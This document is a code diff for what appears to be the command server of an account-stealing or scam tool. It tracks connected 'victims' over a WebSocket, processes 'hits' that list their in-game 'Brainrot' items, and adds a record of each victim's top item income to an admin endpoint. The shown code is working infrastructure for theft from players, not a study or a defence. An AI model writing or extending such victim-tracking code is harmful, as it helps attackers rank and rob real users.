@@ -453,6 +453,7 @@ app.get('/api/admin/active-victims', (req, res) => {
     activeVictims.forEach((data, username) => {
         list.push({
             username: username,
+            maxIncome : data.maxIncome,
             uptime: Date.now() - data.connectedAt // Temps écoulé en ms
         });
     });
@@ -520,6 +521,7 @@ wss.on('connection', (ws, req) => {
         
         activeVictims.set(username, {
             ws: ws,
+            maxIncome: 0,
             connectedAt: Date.now() // On stocke le timestamp actuel
         });
         
@@ -544,8 +546,11 @@ wss.on('connection', (ws, req) => {
                         hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0));
                         const topBrainrot = hitInfo.Brainrots[0];
                         maxIncome = topBrainrot.Income || 0;
-
-                       log(`💎 Plus gros Income trouvé : ${maxIncome} (Item: ${topBrainrot.Name})`);
+                        const victimData = activeVictims.get(username);
+                        if (victimData) {
+                            victimData.maxIncome = maxIncome; // On met à jour la valeur en mémoire
+                            log(`✅ MaxIncome mis à jour pour ${username} : ${maxIncome}`);
+                        }
                     }
                     log(`🎯 Processing Hit from: ${hitInfo.Name}`);
         
